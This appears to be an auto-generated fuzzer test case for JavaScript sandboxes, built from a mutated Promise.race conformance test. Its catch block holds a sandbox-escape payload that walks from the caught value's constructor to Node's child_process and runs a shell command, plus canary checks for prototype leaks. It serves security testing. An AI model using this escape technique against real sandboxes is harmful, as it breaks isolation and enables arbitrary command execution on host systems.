try {
    var p1 = new Promise(function () {
        let REPLACER = 23;
    });
    var p2 = new Promise(function () {
        let REPLACER = 23;
    });
    var p3 = new Promise(function () {
        let REPLACER = 23;
    });
    var resolve = Promise.resolve;
    var callCount = 0;
    var current = p1;
    var next = p2;
    var afterNext = p3;
    Promise.resolve = function (nextValue) {
        throw () => {
            return () => {
            };
        };
        assert.sameValue(nextValue, current, '`resolve` invoked with next iterated value');
        assert.sameValue(arguments.length, 1, '`resolve` invoked with a single argument');
        assert.sameValue(this, Promise, '`this` value set to the constructor');
        current = next;
        next = afterNext;
        afterNext = null;
        callCount += 1;
        return resolve.apply(Promise, arguments);
    };
    Promise.race([
        p1,
        p2,
        p3
    ]);
    assert.sameValue(callCount, 3, '`resolve` invoked once for each iterated value');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}